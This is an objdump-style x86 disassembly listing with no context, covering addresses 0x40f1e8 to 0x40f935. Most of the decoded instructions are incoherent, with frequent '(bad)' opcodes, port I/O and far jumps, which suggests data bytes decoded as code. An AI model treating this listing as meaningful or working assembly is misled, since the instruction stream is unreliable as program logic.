  40f1e8:	jmp    0x40f17a
  40f1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1eb:	push   0x7e
  40f1ed:	mov    dh,0x35
  40f1ef:	int3   
  40f1f0:	aas    
  40f1f1:	sbb    eax,0x32a51c65
  40f1f6:	mov    esp,0xb6a2ef28
  40f1fb:	mov    ds:0xdcb9fc64,eax
  40f200:	jg     0x40f263
  40f202:	mov    bl,0x6e
  40f204:	push   ebp
  40f205:	pop    ecx
  40f206:	push   esi
  40f207:	push   ebx
  40f208:	call   0x2c9075f4
  40f20d:	mov    ch,0x61
  40f20f:	in     al,0xc5
  40f211:	pop    esp
  40f212:	clc    
  40f213:	lock inc esp
  40f215:	adc    eax,0x781a17be
  40f21a:	xchg   edi,eax
  40f21b:	in     al,dx
  40f21c:	mov    ah,0x53
  40f21e:	mov    ebp,0xb43e42ff
  40f223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f224:	mov    al,0x73
  40f226:	scas   al,BYTE PTR es:[edi]
  40f227:	daa    
  40f228:	inc    edx
  40f229:	sub    ch,BYTE PTR ds:0x5ef54b69
  40f22f:	pop    edi
  40f230:	ins    BYTE PTR es:[edi],dx
  40f231:	jge    0x40f274
  40f233:	pop    ecx
  40f234:	push   edi
  40f235:	not    ah
  40f237:	jecxz  0x40f225
  40f239:	adc    BYTE PTR ds:[ebx-0x12],0x61
  40f23e:	test   al,0x2b
  40f240:	cdq    
  40f241:	test   al,0xbd
  40f243:	xor    eax,0x148ea25d
  40f248:	push   cs
  40f249:	inc    ebx
  40f24a:	xor    DWORD PTR [edi],0x169203a4
  40f250:	pop    edx
  40f251:	outs   dx,BYTE PTR ds:[esi]
  40f252:	pop    esi
  40f253:	(bad)  
  40f254:	out    0xde,al
  40f256:	xor    esp,DWORD PTR [ebx-0x67]
  40f259:	dec    esi
  40f25a:	fstp   TBYTE PTR [eax+0x76ecb413]
  40f260:	xchg   ebp,eax
  40f261:	pop    ebp
  40f262:	leave  
  40f263:	cmp    al,0x6c
  40f265:	cmp    eax,0xacecd148
  40f26a:	dec    ecx
  40f26b:	out    0xcb,eax
  40f26d:	push   ecx
  40f26e:	mov    esi,0x6a79e0c2
  40f274:	cld    
  40f275:	jg     0x40f20b
  40f277:	push   eax
  40f278:	lods   eax,DWORD PTR ds:[esi]
  40f279:	enter  0x9fa9,0x85
  40f27d:	xchg   esi,eax
  40f27e:	inc    dx
  40f280:	and    eax,0x3aa4a447
  40f285:	jae    0x40f284
  40f287:	test   al,0xd
  40f289:	pop    esi
  40f28a:	rcr    ch,1
  40f28c:	add    eax,0x1cfb9a31
  40f291:	cmp    ebp,DWORD PTR [ecx+esi*1]
  40f294:	cwde   
  40f295:	sbb    al,0xce
  40f297:	or     al,0xf6
  40f299:	imul   ecx,DWORD PTR ds:0x71ea33b7,0xb
  40f2a0:	inc    ebx
  40f2a1:	xchg   ecx,eax
  40f2a2:	adc    edx,DWORD PTR [ebp-0x3e2753e6]
  40f2a8:	enter  0xee16,0xe
  40f2ac:	jns    0x40f2dd
  40f2ae:	repz or ch,BYTE PTR [ecx+0x11aae41b]
  40f2b5:	(bad)  
  40f2b6:	jecxz  0x40f23e
  40f2b8:	lock push 0xc75742c9
  40f2be:	jle    0x40f2fd
  40f2c0:	and    bh,BYTE PTR [edx-0x1debc360]
  40f2c6:	and    bl,bl
  40f2c8:	xchg   ebx,eax
  40f2c9:	add    bh,BYTE PTR [ebp-0x379388a0]
  40f2cf:	push   ds
  40f2d0:	dec    eax
  40f2d1:	rcl    BYTE PTR [edx],1
  40f2d3:	cmp    dl,bl
  40f2d5:	adc    al,0xa1
  40f2d7:	jge    0x40f2e5
  40f2d9:	addr16 sbb cl,al
  40f2dc:	(bad)  
  40f2dd:	popf   
  40f2de:	mov    eax,ds:0xf74a012a
  40f2e3:	mov    dl,0x54
  40f2e5:	jle    0x40f2e9
  40f2e7:	scas   eax,DWORD PTR es:[edi]
  40f2e8:	out    dx,eax
  40f2e9:	fst    QWORD PTR [eax-0x6b]
  40f2ec:	dec    ebp
  40f2ed:	jno    0x40f30f
  40f2ef:	pop    ebp
  40f2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2f1:	scas   al,BYTE PTR es:[edi]
  40f2f2:	into   
  40f2f3:	fld    QWORD PTR [edi+0x4a]
  40f2f6:	mov    dl,0x62
  40f2f8:	lahf   
  40f2f9:	and    DWORD PTR [ecx-0x1a],ecx
  40f2fc:	das    
  40f2fd:	loopne 0x40f2af
  40f2ff:	sub    edi,esp
  40f301:	test   ebx,esp
  40f303:	call   0xc5b59626
  40f308:	and    eax,0xbb25a66f
  40f30d:	(bad)  
  40f30e:	(bad)  
  40f30f:	xor    eax,0x6451dd94
  40f314:	inc    eax
  40f315:	sub    ebx,DWORD PTR [si-0x2faf]
  40f31a:	in     al,dx
  40f31b:	cmp    ah,BYTE PTR [edi-0x57]
  40f31e:	mov    al,ds:0xa51553c3
  40f323:	ins    BYTE PTR es:[edi],dx
  40f324:	pop    edi
  40f325:	cmp    eax,0x36661659
  40f32a:	or     esi,esp
  40f32c:	dec    esp
  40f32d:	daa    
  40f32e:	(bad)  
  40f32f:	fidivr WORD PTR [edi]
  40f331:	xchg   ebx,eax
  40f332:	pop    ecx
  40f333:	mov    edi,0x5bf4fe7
  40f338:	mov    DWORD PTR [esi-0x6d],ebx
  40f33b:	and    al,0xae
  40f33d:	scas   al,BYTE PTR es:[edi]
  40f33e:	xchg   esi,eax
  40f33f:	push   ds
  40f340:	mov    esi,0xdd02aaef
  40f345:	lods   al,BYTE PTR ds:[esi]
  40f346:	inc    ebp
  40f347:	fcomip st,st(4)
  40f349:	jnp    0x40f3c9
  40f34b:	cmp    cl,BYTE PTR ds:0x5158cad7
  40f351:	ds sub edi,esi
  40f354:	retf   
  40f355:	push   esi
  40f356:	loop   0x40f313
  40f358:	sub    bl,BYTE PTR [esi-0xf958ada]
  40f35e:	std    
  40f35f:	jnp    0x40f31e
  40f361:	(bad)  
  40f362:	fdiv   st,st(0)
  40f364:	sbb    al,0x9c
  40f366:	arpl   WORD PTR [eax-0x1ea3afcb],cx
  40f36c:	xor    bh,BYTE PTR [ebp-0x5361ab19]
  40f372:	sahf   
  40f373:	aas    
  40f374:	xchg   DWORD PTR [eax+0xe],ebx
  40f377:	dec    esi
  40f378:	mov    ebp,0x654bf02b
  40f37d:	adc    esp,DWORD PTR [ecx]
  40f37f:	and    ebp,DWORD PTR [edi]
  40f381:	mov    ah,0x52
  40f383:	mov    DWORD PTR [edi],0x7b3c1d0f
  40f389:	into   
  40f38a:	popf   
  40f38b:	push   esi
  40f38c:	pop    edi
  40f38d:	sbb    BYTE PTR [eax-0x4d96170],ch
  40f393:	xchg   ebp,eax
  40f394:	(bad)  
  40f396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f397:	call   0x95ed:0x861a76ca
  40f39e:	imul   edx,ebx,0x4f0da5a4
  40f3a4:	sub    dl,BYTE PTR [edi+0x2ee6bc1a]
  40f3aa:	mov    ecx,0x7356ac67
  40f3af:	aad    0xaa
  40f3b1:	mov    dh,0xa9
  40f3b3:	(bad)  
  40f3b4:	pop    ebx
  40f3b5:	and    DWORD PTR [edi],ebx
  40f3b7:	nop
  40f3b8:	sbb    DWORD PTR [ebp+0x504d8bcf],esi
  40f3be:	lds    ebp,FWORD PTR [edx]
  40f3c0:	xchg   ecx,eax
  40f3c1:	les    esp,FWORD PTR ds:0xf531fa5
  40f3c7:	push   esi
  40f3c8:	pusha  
  40f3c9:	xchg   edx,eax
  40f3ca:	push   cs
  40f3cb:	into   
  40f3cc:	jbe    0x40f36c
  40f3ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3cf:	in     al,0xce
  40f3d1:	ret    0x486c
  40f3d4:	push   0x21
  40f3d6:	scas   al,BYTE PTR es:[edi]
  40f3d7:	and    DWORD PTR [edx],edx
  40f3d9:	jbe    0x40f3e8
  40f3db:	xor    DWORD PTR [eax+0x2d34f12e],edx
  40f3e1:	jo     0x40f44b
  40f3e3:	icebp  
  40f3e4:	jle    0x40f43d
  40f3e6:	loop   0x40f3d0
  40f3e8:	push   esp
  40f3e9:	adc    DWORD PTR [ebp+0x34],0xf63aaaa7
  40f3f0:	inc    DWORD PTR [edx+0x42]
  40f3f3:	mov    BYTE PTR [ecx+0x65],ch
  40f3f6:	sub    esi,DWORD PTR [ebp+0x7a534656]
  40f3fc:	sbb    ch,BYTE PTR [edx+0x6fe264e2]
  40f402:	(bad)  
  40f403:	inc    edx
  40f404:	ins    BYTE PTR es:[edi],dx
  40f405:	int    0x96
  40f407:	or     ch,cl
  40f409:	sub    edx,ecx
  40f40b:	push   DWORD PTR [edx]
  40f40d:	pop    es
  40f40e:	cmp    dl,0xb6
  40f411:	leave  
  40f412:	fld    QWORD PTR [ebp+esi*8+0x64]
  40f416:	jb     0x40f46f
  40f418:	pop    ds
  40f419:	push   edi
  40f41a:	cs cld 
  40f41c:	mov    eax,0xa2acd777
  40f421:	retf   
  40f422:	test   eax,0x4732ed36
  40f427:	mov    eax,ds:0x49333f70
  40f42c:	xchg   ecx,eax
  40f42d:	rcl    DWORD PTR [ebp+0x97e0722],0x50
  40f434:	and    dh,dh
  40f436:	ror    BYTE PTR [edx],1
  40f438:	sub    ah,BYTE PTR [ecx-0x29]
  40f43b:	rol    DWORD PTR [eax],0x2a
  40f43e:	cmc    
  40f43f:	cs sbb eax,0x4bc1145e
  40f445:	fnsave [edx+0x5284d193]
  40f44b:	imul   ecx,DWORD PTR [ebp-0x42a31542],0x1c
  40f452:	jg     0x40f43c
  40f454:	xor    al,0x9f
  40f456:	mov    DWORD PTR [eax+0x44],0x8b46a603
  40f45d:	cmp    BYTE PTR [ebp+0x7f],al
  40f460:	jo     0x40f42d
  40f462:	jecxz  0x40f495
  40f464:	dec    eax
  40f465:	or     DWORD PTR [esi-0x27],edi
  40f468:	push   eax
  40f469:	outs   dx,BYTE PTR ds:[esi]
  40f46a:	shl    edx,cl
  40f46c:	ins    BYTE PTR es:[edi],dx
  40f46d:	repz xchg ebx,eax
  40f46f:	popf   
  40f470:	sub    ch,dl
  40f472:	cld    
  40f473:	cdq    
  40f474:	mov    al,0xed
  40f476:	mov    eax,0x46ebbfa1
  40f47b:	fild   DWORD PTR [esi]
  40f47d:	std    
  40f47e:	push   esp
  40f47f:	inc    eax
  40f480:	jecxz  0x40f4c9
  40f482:	out    0x6d,al
  40f484:	mov    edi,0x74cc54da
  40f489:	rcl    ch,1
  40f48b:	sar    DWORD PTR [ebx],0x18
  40f48e:	hlt    
  40f48f:	mov    eax,0x161eba1f
  40f494:	das    
  40f495:	sar    BYTE PTR [esi],1
  40f497:	into   
  40f498:	mov    ah,0xca
  40f49a:	push   ecx
  40f49b:	icebp  
  40f49c:	fld    DWORD PTR [ecx+0x54783c6]
  40f4a2:	xchg   ebx,eax
  40f4a3:	shr    DWORD PTR [eax],1
  40f4a5:	stos   BYTE PTR es:[di],al
  40f4a7:	push   0x37cedbbf
  40f4ac:	xlat   BYTE PTR ds:[ebx]
  40f4ad:	add    DWORD PTR [edx+0x2f550cd6],ebx
  40f4b3:	cmp    eax,0x5b7be562
  40f4b8:	push   ds
  40f4b9:	jne    0x40f4fa
  40f4bb:	lock sub DWORD PTR ss:[esi+ebx*4+0x66],0xfffffff8
  40f4c2:	pop    es
  40f4c3:	stos   BYTE PTR es:[edi],al
  40f4c4:	mov    fs:0xb0b54a8c,eax
  40f4ca:	and    BYTE PTR [ebx+eiz*1-0x66],bh
  40f4ce:	(bad)  [edx]
  40f4d0:	inc    edx
  40f4d1:	sbb    edi,DWORD PTR [edx]
  40f4d3:	xchg   esp,eax
  40f4d4:	clc    
  40f4d5:	dec    eax
  40f4d6:	outs   dx,BYTE PTR ds:[esi]
  40f4d7:	repnz pop ds
  40f4d9:	pop    ebp
  40f4da:	xor    dh,cl
  40f4dc:	cld    
  40f4dd:	cmp    dh,BYTE PTR [eax]
  40f4df:	lds    ebp,FWORD PTR [edx]
  40f4e1:	fs pop es
  40f4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4e4:	inc    eax
  40f4e5:	mov    bl,0x7e
  40f4e7:	gs icebp 
  40f4e9:	dec    eax
  40f4ea:	mov    ebp,0xac2fec4e
  40f4ef:	das    
  40f4f0:	addr16 dec ebx
  40f4f2:	fs loopne 0x40f531
  40f4f5:	jecxz  0x40f4db
  40f4f7:	sbb    eax,0xe1cd22d5
  40f4fc:	xor    bl,BYTE PTR [edi]
  40f4fe:	mov    esi,0x4acbb17
  40f503:	cdq    
  40f504:	stc    
  40f505:	and    dh,BYTE PTR [ecx-0x74d6075c]
  40f50b:	pop    esi
  40f50c:	push   0x1b
  40f50e:	es pop ss
  40f510:	in     eax,dx
  40f511:	add    edx,edx
  40f513:	(bad)  
  40f514:	(bad)  
  40f515:	aas    
  40f516:	inc    edx
  40f517:	pop    eax
  40f518:	les    ebp,FWORD PTR [edi+eiz*8]
  40f51b:	call   0x9cada64b
  40f520:	retf   0xcbd6
  40f523:	and    DWORD PTR [ebx+edx*8-0x78db137],ebp
  40f52a:	and    ebp,DWORD PTR [edx-0x1d]
  40f52d:	mov    ch,cl
  40f52f:	push   esi
  40f530:	or     eax,0xcf4ecb88
  40f535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f536:	add    eax,0x7c48b4a8
  40f53b:	xor    DWORD PTR ds:0xa068d467,eax
  40f541:	or     ch,cl
  40f543:	adc    eax,0x9806571a
  40f548:	or     al,0xfa
  40f54a:	popa   
  40f54b:	in     al,dx
  40f54c:	cmp    BYTE PTR [edi-0x15f0e25e],0x7a
  40f553:	scas   eax,DWORD PTR es:[edi]
  40f554:	mov    ds:0x91ba82d1,al
  40f559:	leave  
  40f55a:	xchg   DWORD PTR [ebx-0x14],esi
  40f55d:	pop    ebx
  40f55e:	jmp    0x4e51:0x898a501f
  40f565:	into   
  40f566:	retf   
  40f567:	mov    ah,0xf5
  40f569:	adc    al,0x1b
  40f56b:	test   DWORD PTR [ebp-0x4c],ecx
  40f56e:	daa    
  40f56f:	out    dx,eax
  40f570:	pop    esi
  40f571:	inc    esi
  40f572:	inc    esi
  40f573:	push   es
  40f574:	lahf   
  40f575:	fcmovu st,st(2)
  40f577:	and    BYTE PTR [eax+esi*2],bl
  40f57a:	fidivr DWORD PTR [eax+0x7b43950f]
  40f580:	add    ah,BYTE PTR [ecx+0x27]
  40f583:	aam    0xc4
  40f585:	test   eax,0xbe47a80c
  40f58a:	mov    edi,0xc4401c64
  40f58f:	ja     0x40f516
  40f591:	in     eax,dx
  40f592:	push   ds
  40f593:	in     eax,dx
  40f594:	xchg   BYTE PTR [edx-0x7f],ch
  40f597:	jns    0x40f570
  40f599:	sub    DWORD PTR [esi+0x75cb136e],ebp
  40f59f:	xor    eax,DWORD PTR [esi+0x6d161d41]
  40f5a5:	pop    ds
  40f5a6:	mov    ebp,0xfad00c0f
  40f5ab:	int    0xd4
  40f5ad:	push   ebx
  40f5ae:	pop    ds
  40f5af:	cmp    ebx,DWORD PTR [esi-0xc]
  40f5b2:	push   ss
  40f5b3:	je     0x40f55e
  40f5b5:	cli    
  40f5b6:	pop    ss
  40f5b7:	test   al,0x23
  40f5b9:	push   ebp
  40f5ba:	test   BYTE PTR [esi],ah
  40f5bc:	push   DWORD PTR [esi+0x7b]
  40f5bf:	xor    ecx,edx
  40f5c1:	cld    
  40f5c2:	cmp    BYTE PTR [ecx],dl
  40f5c4:	or     ebx,edi
  40f5c6:	adc    DWORD PTR [ebp-0x4a],ebp
  40f5c9:	adc    al,0xe5
  40f5cb:	or     edi,DWORD PTR [ebp+0x49]
  40f5ce:	mov    WORD PTR [esi-0x401956a4],ss
  40f5d4:	outs   dx,DWORD PTR ds:[esi]
  40f5d5:	jle    0x40f5fb
  40f5d7:	sbb    eax,0xd6b7c0cf
  40f5dc:	inc    ebp
  40f5dd:	push   esp
  40f5de:	js     0x40f57e
  40f5e0:	adc    DWORD PTR [edx+0x33c2db08],ebp
  40f5e6:	and    eax,0xd211ea63
  40f5eb:	(bad)  
  40f5ec:	out    dx,al
  40f5ed:	xor    esp,ebx
  40f5ef:	inc    ebx
  40f5f0:	(bad)  
  40f5f2:	retf   0x795f
  40f5f5:	out    dx,eax
  40f5f6:	test   al,0x94
  40f5f8:	push   ds
  40f5f9:	xchg   ebx,eax
  40f5fa:	lods   eax,DWORD PTR ds:[esi]
  40f5fb:	mov    cs,WORD PTR [ecx-0x50]
  40f5fe:	in     al,dx
  40f5ff:	mov    esp,0x6ea7e300
  40f604:	pop    eax
  40f605:	int    0xb7
  40f607:	outs   dx,BYTE PTR ds:[esi]
  40f608:	out    dx,al
  40f609:	pop    ss
  40f60a:	xor    al,0x92
  40f60c:	mov    dl,0x23
  40f60e:	sub    dl,cl
  40f610:	aas    
  40f611:	fnstenv [edi]
  40f613:	cwde   
  40f614:	add    al,dh
  40f616:	jmp    0x19c50896
  40f61b:	pop    es
  40f61c:	inc    DWORD PTR [ebx]
  40f61e:	loop   0x40f65d
  40f620:	ret    
  40f621:	add    eax,eax
  40f623:	shl    DWORD PTR [edi+0x79],0x63
  40f627:	jb     0x40f5fb
  40f629:	pusha  
  40f62a:	cmc    
  40f62b:	dec    eax
  40f62c:	jb     0x40f62f
  40f62e:	inc    edx
  40f62f:	sar    DWORD PTR [edx],cl
  40f631:	pop    ebp
  40f632:	in     eax,0x33
  40f634:	push   ds
  40f635:	pop    edi
  40f636:	cli    
  40f637:	mov    ah,0x76
  40f639:	add    DWORD PTR [edx],0xdb743544
  40f63f:	gs xchg ecx,eax
  40f641:	jge    0x40f64a
  40f643:	xchg   dl,bh
  40f645:	cmp    eax,0xb525934f
  40f64a:	sbb    edx,DWORD PTR [eax+0x7aa3ff9]
  40f650:	mov    ah,BYTE PTR [ebx-0x49]
  40f653:	adc    al,cl
  40f655:	cmp    BYTE PTR [esi+ebp*2],0x8f
  40f659:	daa    
  40f65a:	sti    
  40f65b:	mov    ebx,0x8e93498b
  40f660:	repnz sbb eax,0xe29a1397
  40f666:	jg     0x40f6b9
  40f668:	inc    ebp
  40f669:	jne    0x40f6c3
  40f66b:	push   ds
  40f66c:	or     esi,DWORD PTR ds:0x11d47bb6
  40f672:	imul   esi,DWORD PTR [ecx],0xeb23a9b
  40f678:	jl     0x40f6c0
  40f67a:	pop    eax
  40f67b:	out    0x60,eax
  40f67d:	adc    bl,BYTE PTR [ebp-0x9685954]
  40f683:	mov    eax,0x898fd73
  40f689:	fcomp  DWORD PTR [ecx]
  40f68b:	jge    0x40f663
  40f68d:	jle    0x40f6ec
  40f68f:	mov    DWORD PTR [ebp+0x3b3e008d],esp
  40f695:	stc    
  40f696:	nop
  40f697:	in     eax,dx
  40f698:	and    BYTE PTR [esi],al
  40f69a:	mov    bh,bh
  40f69c:	inc    esp
  40f69d:	jge    0x40f6db
  40f69f:	lea    eax,[eax-0x1d]
  40f6a2:	aaa    
  40f6a3:	jmp    0xcb0b:0x57515f7e
  40f6aa:	lock repz iret 
  40f6ad:	call   0x80ad:0xd17e928
  40f6b4:	cmp    bl,BYTE PTR [edi+0x26]
  40f6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6b8:	sbb    dh,BYTE PTR [ecx+ecx*2+0x18]
  40f6bc:	cmc    
  40f6bd:	add    eax,0x6cc7cf00
  40f6c2:	rcr    BYTE PTR [edx],cl
  40f6c4:	and    DWORD PTR ds:0x762ef01b,ecx
  40f6ca:	mov    esp,0xcfabd5a5
  40f6cf:	fcom   DWORD PTR [ebx+ebx*2-0x58]
  40f6d3:	jmp    0x7bb99fb4
  40f6d8:	jnp    0x40f6e3
  40f6da:	xor    eax,0x5b48bbf5
  40f6df:	push   0x31
  40f6e1:	xor    ecx,DWORD PTR ds:0xe29f847d
  40f6e7:	sar    DWORD PTR [edi-0xc],0x29
  40f6eb:	loopne 0x40f71f
  40f6ed:	not    ebp
  40f6ef:	cmp    eax,0xd814859b
  40f6f4:	add    eax,0x79c03481
  40f6f9:	pop    eax
  40f6fa:	pop    DWORD PTR [ecx+0x2a1499eb]
  40f700:	or     ecx,DWORD PTR [eax-0x2b]
  40f703:	test   ebx,0x2a4f38a8
  40f709:	inc    edx
  40f70a:	sbb    BYTE PTR [ebp-0x63],dh
  40f70d:	xchg   esp,eax
  40f70e:	and    BYTE PTR ds:0x4a9f80e3,bh
  40f714:	jb     0x40f6ad
  40f716:	xchg   esi,eax
  40f717:	dec    ebx
  40f718:	sbb    eax,0xcfc005e1
  40f71d:	or     eax,0x7c1735db
  40f722:	xchg   BYTE PTR [ebx+eax*4+0x679da4fc],ch
  40f729:	ja     0x40f700
  40f72b:	add    DWORD PTR [esi-0x2582b03f],edx
  40f731:	adc    edx,DWORD PTR [ecx+0x443b5ae9]
  40f737:	mov    edx,0x93c819b9
  40f73c:	mov    eax,DWORD PTR [ebx+0x62]
  40f73f:	push   edx
  40f740:	jge    0x40f6ca
  40f742:	fdiv   DWORD PTR [ebx+0x7001b2f8]
  40f748:	cmc    
  40f749:	ins    BYTE PTR es:[edi],dx
  40f74a:	inc    edi
  40f74b:	mov    WORD PTR [esi+0x57441b26],?
  40f751:	fadd   QWORD PTR [edx-0xe]
  40f754:	pop    ss
  40f755:	xchg   ebp,eax
  40f756:	jne    0x40f7c8
  40f758:	push   edx
  40f759:	or     BYTE PTR [eax+0x6],cl
  40f75c:	pop    ecx
  40f75d:	pop    eax
  40f75e:	daa    
  40f75f:	inc    edx
  40f760:	pop    ebx
  40f761:	shl    BYTE PTR [ebx],1
  40f763:	jo     0x40f6f0
  40f765:	adc    dl,ch
  40f767:	pop    esp
  40f768:	int3   
  40f769:	add    eax,0x2050a76c
  40f76e:	push   0xffffff8f
  40f770:	stos   BYTE PTR es:[edi],al
  40f771:	push   ss
  40f772:	loopne 0x40f7b4
  40f774:	(bad)
  40f777:	pusha  
  40f778:	aaa    
  40f779:	ss mov esi,0xca0effd9
  40f77f:	ss sub al,0xa5
  40f782:	pushf  
  40f783:	mov    ah,0x34
  40f785:	sub    eax,0x706a1816
  40f78a:	mov    dh,0x3f
  40f78c:	and    cl,BYTE PTR [edi]
  40f78e:	ss out 0x7f,eax
  40f791:	mov    ?,WORD PTR ds:0xf75da990
  40f797:	xchg   ecx,eax
  40f798:	pop    ss
  40f799:	loop   0x40f736
  40f79b:	lods   eax,DWORD PTR ds:[esi]
  40f79c:	xor    BYTE PTR [eax-0x20856af6],0x40
  40f7a3:	ja     0x40f759
  40f7a5:	bound  edi,QWORD PTR [ebx]
  40f7a7:	cmp    esi,ebx
  40f7a9:	cmp    DWORD PTR [eax+0x1b],ebp
  40f7ac:	loope  0x40f75a
  40f7ae:	jo     0x40f792
  40f7b0:	xchg   ebp,eax
  40f7b1:	(bad)  
  40f7b3:	jbe    0x40f827
  40f7b5:	dec    edi
  40f7b6:	ins    BYTE PTR es:[edi],dx
  40f7b7:	cmp    BYTE PTR [edx-0x13],al
  40f7ba:	push   ebp
  40f7bb:	sti    
  40f7bc:	dec    esp
  40f7bd:	and    eax,0x1fac4c7
  40f7c2:	sar    DWORD PTR [ebp+0x71],0xa6
  40f7c6:	mov    ds:0x37bc22d5,eax
  40f7cb:	xchg   edx,eax
  40f7cc:	xchg   edx,eax
  40f7cd:	fdecstp 
  40f7cf:	dec    ecx
  40f7d0:	lods   eax,DWORD PTR ds:[esi]
  40f7d1:	cmp    edx,DWORD PTR [ecx]
  40f7d3:	cwde   
  40f7d4:	adc    edx,DWORD PTR [esi+0x2a]
  40f7d7:	scas   eax,DWORD PTR es:[edi]
  40f7d8:	pop    ss
  40f7d9:	(bad)  
  40f7da:	call   0xda515e2a
  40f7df:	pop    esi
  40f7e0:	les    esi,FWORD PTR [eax+0xbcf8e2c]
  40f7e6:	push   0xba2db1e5
  40f7eb:	sbb    al,0x41
  40f7ed:	add    eax,0x16ec1c67
  40f7f2:	mov    dh,0xa2
  40f7f4:	xchg   dl,bh
  40f7f6:	jne    0x40f7dd
  40f7f8:	pusha  
  40f7f9:	dec    edi
  40f7fa:	sub    BYTE PTR [edx],ch
  40f7fc:	fadd   QWORD PTR [ebx-0x2a]
  40f7ff:	push   ss
  40f800:	(bad)  
  40f801:	out    dx,eax
  40f802:	dec    esp
  40f803:	je     0x40f7ec
  40f805:	enter  0xa94a,0x5b
  40f809:	jp     0x40f80d
  40f80b:	jbe    0x40f82f
  40f80d:	push   0x43e94aad
  40f812:	mov    BYTE PTR [ebx],cl
  40f814:	repnz cdq 
  40f816:	mov    eax,0x52ba1bf2
  40f81b:	inc    ecx
  40f81c:	test   eax,esp
  40f81e:	addr16 (bad) 
  40f820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f821:	adc    bh,ch
  40f823:	dec    ecx
  40f824:	sbb    bh,bl
  40f826:	into   
  40f827:	ins    DWORD PTR es:[edi],dx
  40f828:	addr16 dec edx
  40f82a:	mov    BYTE PTR [esi],al
  40f82c:	pop    edi
  40f82d:	or     BYTE PTR [esi],bl
  40f82f:	mov    bl,0x1e
  40f831:	pop    edx
  40f832:	scas   al,BYTE PTR es:[edi]
  40f833:	push   0x34e46a0e
  40f838:	jae    0x40f86a
  40f83a:	leave  
  40f83b:	stc    
  40f83c:	in     eax,0x33
  40f83e:	call   0x8caa:0x1c9a4d1b
  40f845:	aas    
  40f846:	lahf   
  40f847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f848:	push   ss
  40f849:	push   ds
  40f84a:	cmp    DWORD PTR [esi],0xffffffc3
  40f84d:	in     eax,0x2c
  40f84f:	addr16 loop 0x40f858
  40f852:	jo     0x40f883
  40f854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f855:	lock das 
  40f857:	mov    al,0xba
  40f859:	mov    cl,0x95
  40f85b:	dec    ecx
  40f85d:	add    edi,DWORD PTR [ecx-0x6180908d]
  40f863:	inc    esi
  40f864:	jno    0x40f85a
  40f866:	sbb    ch,dl
  40f868:	jmp    0x40f8d5
  40f86a:	xchg   esi,eax
  40f86b:	pushf  
  40f86c:	cmp    dl,ah
  40f86e:	fxch   st(2)
  40f870:	add    esi,0xfffffff2
  40f873:	retf   0x8dcd
  40f876:	ret    
  40f877:	xlat   BYTE PTR ds:[ebx]
  40f878:	gs mov dl,0x22
  40f87b:	jb     0x40f83a
  40f87d:	add    dl,dh
  40f87f:	out    0xf,al
  40f881:	ins    BYTE PTR es:[edi],dx
  40f882:	and    BYTE PTR [ebx],0xa1
  40f885:	fs jecxz 0x40f904
  40f888:	xor    DWORD PTR [eax+esi*1+0x27],esi
  40f88c:	cwde   
  40f88d:	xor    al,0x67
  40f88f:	scas   eax,DWORD PTR es:[edi]
  40f890:	xchg   esi,eax
  40f891:	mul    cl
  40f893:	aam    0x41
  40f895:	loopne 0x40f855
  40f897:	jns    0x40f871
  40f899:	rol    BYTE PTR [edx],cl
  40f89b:	xchg   DWORD PTR [ebp+0x1b4e1cd3],ebx
  40f8a1:	imul   esi,DWORD PTR [edi],0xffffffa0
  40f8a4:	ds int3 
  40f8a6:	dec    edi
  40f8a7:	inc    eax
  40f8a8:	popf   
  40f8a9:	dec    ebx
  40f8aa:	fidivr DWORD PTR [ebx+0x6b]
  40f8ad:	pop    eax
  40f8ae:	aas    
  40f8af:	jmp    0x4db7:0x7f4d7c67
  40f8b6:	jl     0x40f897
  40f8b8:	xchg   esi,eax
  40f8b9:	mov    bh,0x61
  40f8bb:	mov    bh,0x5
  40f8bd:	dec    esp
  40f8be:	mul    DWORD PTR [ebx-0x71]
  40f8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c2:	adc    al,0xdc
  40f8c4:	inc    esi
  40f8c5:	ss push ds
  40f8c7:	mov    cl,0x7a
  40f8c9:	fldcw  WORD PTR [ecx+0x30]
  40f8cc:	into   
  40f8cd:	bound  ecx,QWORD PTR [edx]
  40f8cf:	xchg   esi,eax
  40f8d0:	(bad)  
  40f8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d2:	and    BYTE PTR [ecx],cl
  40f8d4:	inc    eax
  40f8d5:	jg     0x40f8a8
  40f8d7:	(bad)  
  40f8d8:	scas   eax,DWORD PTR es:[edi]
  40f8d9:	dec    ecx
  40f8da:	or     ebp,esi
  40f8dc:	mov    bl,0x97
  40f8de:	adc    al,0x26
  40f8e0:	sbb    DWORD PTR [ebp+0x1421a912],esi
  40f8e6:	out    dx,al
  40f8e7:	add    eax,0x92fac8aa
  40f8ec:	in     al,dx
  40f8ed:	inc    ecx
  40f8ee:	adc    bh,bl
  40f8f0:	adc    DWORD PTR [ebx-0x5f3c64c5],ecx
  40f8f6:	les    edx,FWORD PTR [ebp-0x2a]
  40f8f9:	call   0x8300:0xe363cbe8
  40f900:	faddp  st(0),st
  40f902:	js     0x40f933
  40f904:	inc    esi
  40f905:	mov    edi,0x4ac733a1
  40f90a:	into   
  40f90b:	sbb    ebp,edi
  40f90d:	mov    al,0x4b
  40f90f:	inc    eax
  40f910:	jle    0x40f97a
  40f912:	or     DWORD PTR [ecx-0x46],esp
  40f915:	push   edi
  40f916:	out    0x27,al
  40f918:	add    DWORD PTR [ecx+0x7e980566],ebx
  40f91e:	repz add DWORD PTR [edi+0x5a],edx
  40f922:	mov    bl,0x21
  40f924:	mov    es,WORD PTR [edx]
  40f926:	jns    0x40f8fc
  40f928:	xor    al,0x19
  40f92a:	inc    ecx
  40f92b:	fwait
  40f92c:	push   ss
  40f92d:	xchg   esi,eax
  40f92e:	out    0x33,al
  40f930:	mov    edx,0x2d1e621f
  40f935:	out    dx,al
